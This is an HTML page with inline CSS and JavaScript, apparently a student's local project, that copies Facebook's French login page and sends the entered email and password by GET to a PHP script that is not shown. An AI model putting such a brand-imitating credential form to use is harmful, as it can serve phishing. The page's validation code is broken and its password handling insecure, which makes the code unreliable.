<!DOCTYPE html>
<html>
<head>
	<title>index</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="C:\wamp64\www\facesite\fichier-css">
	<style type="text/css">
		.pdiv{
	width: 100%;
	height: 600px;
	position: relative;
	background-color: rgb(228,228,228);
}
.pdiv .ppdiv{
	width: 30%;
	height: 200px;
	position: absolute;
	top: 150px;
	left: 10%;


}
.pdiv .ppdiv img{
	width: 250px;
	height: 80px;
	position: absolute;
	left: 12%;

}
.pdiv .ppdiv p{
	width: 	500px;
	font-size: 30px;
	position: absolute;
	top: 70px;
	left: 12%;
}
.pdiv .pddiv{
	width: 25%;
	height: 300px;
	position: absolute;
	right: 8%;
	top: 150px;
	background-color: white;
	border-radius: 4px;
}
.pdiv .pddiv form input{
	width: 300px;
	height: 40px;
	margin-left: 17px;
	border-radius: 2px;
	border-width: 0.2px;
	border-color: rgb(228,228,228);
	text-transform: capitalize;
	word-spacing: 1px;
	font-size: 16px;
}
.pdiv .pddiv p a{
	color: blue;
	margin-left: 30%;
}
.pdiv .pddiv button {
	position: absolute;
	left: 30%;
	bottom:  10px;
	background-color: rgb(0,236,60);
	height: 40px;
	border-style: none;
	width: 140px;
	text-transform: capitalize;
	font-size: 14px;
	color: white;
	font-weight: bold;

}
.enreg{
	background-color: rgb(0,128,192);
	font-size: 20px;
	font-weight: bold;
	color: white;
	text-transform: capitalize;
}
.pdiv .pp{
	position: absolute;
	right: 10%;
	bottom: 50px;
	text-transform: capitalize;
	font-size: 12px;
	font-weight: bold;
	width: 25%;
	word-spacing: 3px;
	text-align: center;
}
.pp a{
	font-size:18px; 
}
.ddiv ul {
	column-count: 9;
	list-style-type: none;
	width: 90%;
	column-width: 30px;
}
.ddiv ul li a{
	text-decoration: none;
	color: rgb(144,144,144);

}
.ddiv ul li button{
	background-color: rgb(0,236,60);
	border-style: none;
}
#lienp{
	text-decoration: none;
	color: white;
}

	</style>

	
	<script type="text/javascript" src="C:\wamp64\www\facesite\fichier-js\index.js">
		
	</script>

</head>
<body onload="pdesign()">
<div class="pdiv">
	<div class="ppdiv">
		<img src="th.jpg">
		<p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
	</div>
	<div class="pddiv" id="pddiv">
		<form action="pauthentif.php" method="GET" name="f">
			<input type="text" name="email" placeholder="adresse e-mail ou numéro de tél" id="email" required onmousemove ="edesign(this)" onmouseout ="invdesign(this)" autofocus="autofocus">
			<br>
			<span id="espan"></span>
			<br>
			<br>
			<input type="password" name="motdepasse" placeholder="mot de passe" id="motdepasse" required onmousemove ="edesign(this)" onmouseout ="invdesign(this)">
			<span id="mspan"></span>

			<br>
			<br>
			<input type="submit" name="inscri" value="connexion" class="enreg" id="boutonenvoie" onmouseover="dbutton(this)" onmouseout="fbutton(this)">
			</form>
			<p><a href="" id="pl" onmouseover="dpl(this)" onmouseout="fpl(this)">mot de passe oublier?</a></p>
			<br>
			<hr>
			<br>
			<br>
			<button onmouseover="dinscri(this)" onmouseout="finscri(this)" id="boutoninscri">créer un compte</button>

			
		
	</div>

	<p class="pp"> <a href="" id="dl" onmouseover="dpl(this)" onmouseout="fpl(this)">Créer une Page</a> pour une célébrité, un groupe ou une entreprise.</p>
</div>
<div class="ddiv">
	<ul>
		<li>Francais (France)</li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">arabe</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">English(US)</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">italiano</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">Deutsh</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">Espanol</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">Portuges(Brasil)</a></li>
		<li><a href="" onmouseover="dlist(this)" onmouseout="flist(this)">chine(China)</a></li>
		<li><button onmouseover="dlistb(this)" onmouseout="flistb(this)">plus</button></li>

	</ul>
	<hr>
</div>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript">
	var email=document.getElementById('email');
	var motdepasse=document.getElementById('motdepasse');
	var espan=document.getElementById('espan');
	var mspan=document.getElementById('mspan');
	var boutonenvoie=document.getElementById('boutonenvoie');
	boutonenvoie.addEventListener('click',valide);
	var masque=/[a-zA-Z]/g;
	function valide(){
		if(email.validity.valueMissing){
			event.preventDefault();
			espan.textContent="inserer votre email";
			espan.style.color="red";
			$(document).ready(function(){
				$('#email').trigger('focus');
			});
		}
		else{
			espan.textContent="";
			espan.style.color="white";
		}
		if((motdepasse.validity.valueMissing) || (motdepasse.match(masque)=null)) {
			event.preventDefault();
			mspan.textContent="inserer votre mot de passe";
			mspan.style.color="red";
			$(document).ready(function(){
				$('#motdepasse').trigger('focus');
			});
		}
		else{
			mspan.textContent="";
			mspan.style.color="white";
		}
	}

	function pdesign(){
	var pddiv=document.getElementById('pddiv');
	var pl=document.getElementById('pl');
	var dl=document.getElementById('dl');
	pddiv.style.boxShadow="2px 2px 2px rgb(120,120,120)";
	pl.style.textDecoration ="none";
	pl.style.textTransform ="capitalize";
	pl.style.fontVariant="small-caps";
	dl.style.textDecoration ="none";
}
function edesign(e){
	e.style.borderColor="rgb(0,128,255)";
}
function invdesign(e){
	e.style.borderColor="black";
}
function dbutton(e){
	e.style.backgroundColor="rgb(0,102,151)";
}
function fbutton(e){
	e.style.backgroundColor="rgb(0,128,192)";
}
function dpl(e){
	e.style.textDecoration ="underline";
}
function fpl(e){
	e.style.textDecoration ="none";
}
function dinscri(e){
	e.style.backgroundColor="rgb(0,185,47)";
}
function finscri(e){
	e.style.backgroundColor="rgb(0,236,60)";
}
function dlist(e){
	e.style.textDecoration ="underline";
}
function flist(e){
	e.style.textDecoration ="none";
}
function dlistb(e){
	e.style.backgroundColor="rgb(0,185,47)";
}
function flistb(e){
	e.style.backgroundColor="rgb(0,236,60)";
}
var boutoninscri=document.getElementById('boutoninscri');
boutoninscri.addEventListener('click',formulairedinscription);
function formulairedinscription(){
	window.open('formulaire-dinscri-facebook.php','_blanc');
}
</script>

</body>
</html>